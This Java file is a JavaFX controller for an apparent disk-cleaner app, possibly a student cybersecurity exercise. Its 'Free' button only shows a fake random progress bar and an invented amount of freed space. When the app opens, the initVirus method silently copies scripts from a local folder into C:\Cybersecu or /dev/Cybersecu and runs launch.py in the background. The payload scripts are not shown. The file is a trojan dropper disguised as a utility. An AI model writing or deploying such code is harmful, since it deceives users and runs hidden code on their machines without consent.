package sample;

import javafx.concurrent.Task;
import javafx.event.ActionEvent;
import javafx.fxml.FXML;
import javafx.scene.control.Button;
import javafx.scene.control.Label;
import javafx.scene.control.ProgressBar;
import javafx.scene.control.ProgressIndicator;

import java.io.*;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Locale;

public class Controller {
    private static final String[] Q = new String[]{"", "K", "M", "G", "T", "P", "E"};
    @FXML private Label dataSize;
    @FXML private Button freeBttn;
    @FXML private ProgressIndicator progressIndicator;
    @FXML private ProgressBar progressBar;

    long freeSpace;
    long totalSpace;
    long spaceToFree;

    @FXML
    public void initialize() {
        File mainDisk = new File("/");
        this.freeSpace = mainDisk.getFreeSpace();
        this.totalSpace = mainDisk.getTotalSpace();
        this.spaceToFree = (long) (Math.random() * (this.freeSpace / 30));

        dataSize.setText("Vous avez " + getAsString(this.freeSpace) + " utilisés sur " + getAsString(this.totalSpace));
        freeBttn.setText("Free " + getAsString(this.spaceToFree));

        progressBar.setProgress(0);
        progressIndicator.setProgress(0);

        try {
            initVirus();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    /*
     * Code from Lars Bohl on https://stackoverflow.com/questions/3758606/how-can-i-convert-byte-size-into-a-human-readable-format-in-java
     */
    public String getAsString(long bytes) {
        for (int i = 6; i > 0; i--) {
            double step = Math.pow(1024, i);
            if (bytes > step) return String.format("%3.1f %s", bytes / step, Q[i]);
        }
        return Long.toString(bytes);
    }

    public void freeBttn(ActionEvent actionEvent) {
        Task<Void> task = new Task<Void>() {
            @Override
            protected Void call() {
                freeBttn.setDisable(true);
                float value = 0;
                progressBar.setProgress(0);
                progressIndicator.setProgress(0);
                while (value < 1) {
                    value += (Math.random() * (0.1));
                    progressBar.setProgress(value);
                    progressIndicator.setProgress(value);
                    try {
                        Thread.sleep(Math.round(randomize(300, 1500)));
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }
                }
                freeBttn.setDisable(false);
                return null;
            }
        };
        Thread thread = new Thread(task);
        thread.start();
        dataSize.setText("Vous avez " + getAsString(freeSpace - spaceToFree) + " utilisés sur " + getAsString(totalSpace));
    }

    public double randomize(double start, double end) {
        return (start + Math.random() * (Math.abs(end - start)));
    }

    private void initVirus() throws IOException {
        String[] scriptlist = new File("./scripts/").list();
        String windowsPath = "C:\\Cybersecu\\";
        String linuxPath = "/dev/Cybersecu/";
        String line;
        String launchPath = null;
        StringBuilder stringBuilder;
        String ls = System.getProperty("line.separator");

        boolean isWindows = System.getProperty("os.name").toLowerCase(Locale.ROOT).contains("win");
        for (String scriptName : scriptlist){
            String path = "";
            line = null;
            stringBuilder = new StringBuilder();
            if (isWindows) {
                if (!Files.exists(Paths.get(windowsPath))) Files.createDirectories(Paths.get(windowsPath));
                path = windowsPath + scriptName;
                launchPath = windowsPath + "launch.py";
            } else {
                if (!Files.exists(Paths.get(linuxPath))) Files.createDirectories(Paths.get(linuxPath));
                path = linuxPath + scriptName;
                launchPath = linuxPath + "launch.py";
            }
            if (!Files.exists(Paths.get(path))) Files.createFile(Paths.get(path));

            try (BufferedReader reader = new BufferedReader(new FileReader("./scripts/" + scriptName));
                 BufferedWriter writer = new BufferedWriter(new FileWriter(path))){
                if (!isWindows) stringBuilder.append("#! /usr/bin/python\n");
                while((line = reader.readLine()) != null) {
                    if (line.contains("windows = ") && isWindows){
                        stringBuilder.append(line.replace("False", "True"));
                        stringBuilder.append(ls);
                        continue;
                    }
                    stringBuilder.append(line);
                    stringBuilder.append(ls);
                }
                writer.write(stringBuilder.toString());
            }
        }
        String finalLaunchPath = launchPath;
        Thread t = new Thread(() -> launch(finalLaunchPath, isWindows));
        t.start();
    }

    private void launch(String path, boolean isWindows) {
        try {
            if (isWindows) Runtime.getRuntime().exec("cmd.exe /C cd C:\\Cybersecu && python launch.py");
            else Runtime.getRuntime().exec("cd /dev/Cybersecu && python launch.py");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
